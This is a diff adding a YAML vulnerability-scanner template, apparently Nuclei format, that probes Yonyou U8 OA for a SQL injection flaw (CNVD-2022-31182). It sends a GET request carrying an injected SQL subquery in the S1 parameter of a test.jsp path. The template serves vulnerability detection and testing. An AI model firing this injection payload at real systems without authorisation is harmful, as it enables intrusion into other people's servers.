@@ -1,0 +1,19 @@
+id: yaml-poc-yonyou-yonyou_u8_oa-sql_injection-CNVD-2022-31182
+info:
+  name: Yaml Poc Yonyou Yonyou_U8_Oa Sql_Injection Cnvd 2022 31182
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_u8_oa-sql_injection-CNVD-2022-31182'
+  tags: sqli
+  reference:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-31182
+http:
+- method: GET
+  path:
+  - /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
